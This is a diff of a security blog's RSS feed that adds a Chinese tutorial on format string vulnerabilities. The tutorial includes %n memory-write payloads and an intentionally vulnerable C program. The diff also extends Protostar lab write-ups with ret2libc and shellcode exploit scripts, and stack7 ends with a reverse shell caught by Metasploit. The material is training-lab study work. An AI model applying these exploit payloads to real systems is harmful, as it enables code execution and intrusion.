@@ -5,9 +5,91 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 25 Jun 2016 16:32:08 +0800</pubDate>
-    <lastBuildDate>Sat, 25 Jun 2016 16:32:08 +0800</lastBuildDate>
+    <pubDate>Mon, 27 Jun 2016 15:13:16 +0800</pubDate>
+    <lastBuildDate>Mon, 27 Jun 2016 15:13:16 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
+    
+      <item>
+        <title>格式化串漏洞</title>
+        <description>&lt;h3 id=&quot;x01-&quot;&gt;0x01 结论知识&lt;/h3&gt;
+
+&lt;p&gt;1&amp;gt;printf(“%x”)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%x&quot;):未进入printf函数前,第一个栈里的值
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;2&amp;gt;printf(“%8x”)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%8x&quot;):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;3&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$x&quot;)&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%3\$x&quot;):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)来达到同样的目的)
+宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;4&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$n&quot;)&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;AAAA%3\$n&quot;):将4(4个A)写入第三个栈里的值指向的内存空间,也即将第三个栈里的内容看作一个地址，要将该地址处的内容写成4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;5&amp;gt;printf(“\x88\xf0\xff\xbf%10x%10x%10x%1966x%n”)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;\x88\xf0\xff\xbf%10x%10x%10x%1966x%n&quot;):在0xbffff088的内存位置处写入2000(4+10+10+10+1966)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;0x02 原理理解&lt;/p&gt;
+
+&lt;h4 id=&quot;refer&quot;&gt;1&amp;gt;refer&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/binary/7714
+http://drops.wooyun.org/papers/9426
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;c&quot;&gt;2&amp;gt;c代码&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+int main(void)
+{ 
+    int flag = 0;
+    int *p = &amp;amp;flag; 
+    char a[100];
+    scanf(&quot;%s&quot;,a);
+    printf(a);
+
+    if(flag == 2000)
+    {
+        printf(&quot;good!!\n&quot;);
+    }
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;section&quot;&gt;栈空间&lt;/h4&gt;
+&lt;p&gt;printf(“%x”,0x12345678),addr1=0x12345678,[esp+4]=0x12345678,
+从addr3处的格式存放处开始同时与printf的第一个参数%x的下面第一个栈单元内容匹配(这个内容被当作printf的第二个参数,虽然printf在此处只有一个参数),由于addr3处的格式存放处只有%x,所以形如printf(“%x”,something)的函数将
+printf(“%x”,0x41424344)&lt;/p&gt;
+</description>
+        <pubDate>Sun, 26 Jun 2016 00:00:00 +0800</pubDate>
+        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</link>
+        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</guid>
+        
+        <category>格式化串</category>
+        
+        <category>format</category>
+        
+        
+        <category>二进制</category>
+        
+      </item>
     
       <item>
         <title>vim自动换标点</title>
@@ -2774,6 +2856,7 @@ nebula.iso download:    http://pan.baidu.com/s/1nvq3f5J
 some witeup:    
     https://lightless.me/archives/protostar-stack-writeup.html
     http://bug.cool/2016/Protostar_Writeup/
+    https://lightless.me/archives/protostar-format-writeup.html
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -2906,7 +2989,7 @@ link knowledge:
 
 &lt;h4 id=&quot;x06-stack6&quot;&gt;0x06 stack6&lt;/h4&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
-    构造如下链：
+    构造如下链:
     &#39;A&#39;*80+system_addr+exit_addr+command_addr+command(=&#39;/bin/sh\x00&#39;)
     gdb stack6
     disas getpath
@@ -2924,7 +3007,7 @@ link knowledge:
     python -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x58\xf7\xff\xbf&#39;+&#39;echo succeed&#39;+&#39;\x00&#39;&quot; | ./stack6ython -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x48\xf7\xff\xbf&#39;+&#39;/bin/sh\x00&#39;&quot; | ./stack6
     the output is not obviously
     python -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x28\xf8\xff\xbf&#39;+&#39;echo 123456&#39;+&#39;\x00&#39;&quot; | /opt/protostar/bin/stack6
-    output:看上去什么也没发生，应该没有执行成功，然而后来gdb却发现可以成功，具体如下
+    output:看上去什么也没发生,应该没有执行成功,然而后来gdb却发现可以成功,具体如下
     cd /tmp
     vi stack6.py
     --------/tmp/stack6.py----------
@@ -2937,7 +3020,7 @@ link knowledge:
     r &amp;lt; /tmp/stack6.txt
     vi /tmp/succeed.txt
     output:succeed
-    此时已经成功写文件，奇怪！居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
+    此时已经成功写文件,奇怪!居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -2976,14 +3059,70 @@ link knowledge:
     shellcode += &quot;\x09\x02\x53\xe8\x92\x9d\xb5&quot;
     
     ret=0x08048492
-    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x41\x41\x41\x41&#39;+shellcode
+    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x41\x41\x41\x41&#39; #without shellcode here
     f=open(&quot;/tmp/stack7.txt&quot;,&quot;a+&quot;)
     f.write(payload)
     f.close()
     input=payload
     #print input
-    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack5&quot; % input)
+    #os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input) #执行此行时会发生乱码影响shellcode_addr的查找,这句先不执行
     -------------end-------------
+    gdb /opt/protostar/bin/stack7
+    disas getpath
+    b*getpath+128(at ret in getpath func)
+    r &amp;lt; /tmp/stack7.txt
+    x/20x $esp
+    output:
+    0xbffff73c:     0x08048492      0x42424242      0x42424242      0x41414141
+    0xbffff74c:     0xb7eadc00      0x00000001      0xbffff7f4      0xbffff7fc
+    so shellcode_addr=0xbffff74c
+    vi /tmp/stack7.py
+    ------add shellcode and modified shellcode_addr------
+    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x4c\xf7\xff\xbf&#39;+shellcode
+    ...
+    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input)
+    -----------------------end---------------------------
+    rm stack7.txt
+    python stack7.py
+    失败,系统乱码,并未反弹shell,于是分析core文件,gdb动态调试时的地址不一定是正确的
+    ulimit -c unlimited
+    -------modify /tmp/stack7.py--------
+    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x4c\xf7\xff\xbf&#39;
+    ...
+    #os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input)
+    ---------------end------------------
+    rm stack7.txt
+    python stack7.py
+    /opt/protostar/bin/stack7 &amp;lt; /tmp/stack7.txt
+    su 
+    godmode
+    chmod 777 co[tab]
+    gdb -q -c co[tab]
+    x/20x $esp-4
+    output:
+    0xbffff848:     0xbffff83c      0x90909090      0x90909090      0x90909090
+    0xbffff858:     0x90909090      0x90909090      0x90909090      0x90909090
+    ---------modify /tmp/stack7.py--------
+    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x4c\xf8\xff\xbf&#39;+shellcode
+    ...
+    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input)
+    ------------------end-----------------
+    rm stack7.txt
+    python stack7.py
+    msf receive a shell connect from protostar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x07-format0&quot;&gt;0x07 format0&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    ./format0 `python -c &quot;print &#39;A&#39;*64+&#39;\xef\xbe\xad\xde&#39;&quot;`
+    但是题目要求输入为10字节以内,so
+    ./format0 `python -c &quot;print &#39;%64d&#39; + &#39;\xef\xbe\xad\xde&#39;&quot;`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x08-format1&quot;&gt;0x08 format1&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -3907,56 +4046,6 @@ step3:
         
         
         <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>迅雷加密链接批量转化</title>
-        <description>&lt;p&gt;将thunder://….的link转化成可以在迅雷中直接下载的link,eg.ftp://…&lt;br /&gt;
-that is:&lt;br /&gt;
-thunder://…  ==&amp;gt;  ftp://… or something else&lt;br /&gt;
-用于手机迅雷下载vedio时wifi下载速度不快,将手机迅雷中的相应下载link放到pc端下载.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
-    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&#39;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\r\n&#39;,&quot;&quot;,each)&lt;/span&gt;
-            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\n&#39;,&quot;&quot;,each)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;
-        
-    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;thunder://&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decodestring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Sun, 08 May 2016 00:00:00 +0800</pubDate>
-        <link>/python/2016/05/08/thunder/</link>
-        <guid isPermaLink="true">/python/2016/05/08/thunder/</guid>
-        
-        <category>auxilary</category>
-        
-        <category>python</category>
-        
-        
-        <category>python</category>
         
       </item>
     
